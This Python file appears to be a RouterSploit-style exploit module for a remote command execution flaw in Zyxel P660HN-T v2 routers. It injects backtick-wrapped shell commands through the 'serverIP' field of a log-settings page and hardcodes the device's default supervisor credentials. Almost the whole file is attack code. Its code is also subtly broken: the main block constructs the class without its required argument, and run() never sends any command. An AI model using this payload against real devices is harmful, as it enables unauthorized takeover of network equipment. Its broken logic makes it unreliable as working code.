target = ""
# rsf exploit module
# description: Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T V2 devices. If the target is vulnerable it allows to execute commands on operating system level.

import base64
import requests

class Exploit:
    __info__ = {
        "name": "Zyxel P660HN-T v2 RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T V2 devices. If the target is vulnerable it allows to execute commands on operating system level.",
        "authors": ("Pedro Ribeiro <pedrib[at]gmail.com>", "Marcin Bury <marcin[at]threat9.com>"),
        "references": (
            "http://seclists.org/fulldisclosure/2017/Jan/40",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt",
            "https://blogs.securiteam.com/index.php/archives/2910",
        ),
        "devices": ("Zyxel P660HN-T v2",),
    }

    def __init__(self, target, port=80, username='supervisor', password='zyad1234'):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("Target appears to be vulnerable")
            print("Invoking command loop...")
        else:
            print("Target seems to be not vulnerable")

    def execute(self, cmd):
        payload = f"1.1.1.1`{cmd}`&#"
        data = {
            "logSetting_H": "1",
            "active": "1",
            "logMode": "LocalAndRemote",
            "serverPort": "123",
            "serverIP": payload
        }
        requests.post(f'http://{self.target}:{self.port}/cgi-bin/pages/maintenance/logSetting/logSet.asp', data=data)

    def check(self):
        response = requests.get(f'http://{self.target}:{self.port}/js/Multi_Language.js')
        if response.status_code == 200 and "P-660HN-T1A_IPv6" in response.text:
            return True
        return False

    def login(self):
        credentials = base64.b64encode(f"{self.username}:{self.password}".encode()).decode()
        path = f"/cgi-bin/index.asp?{credentials}"
        data = {
            "Loginuser": "supervisor",
            "Prestige_Login": "Login"
        }
        response = self.session.post(f'http://{self.target}:{self.port}{path}', data=data)
        if response.status_code == 200:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
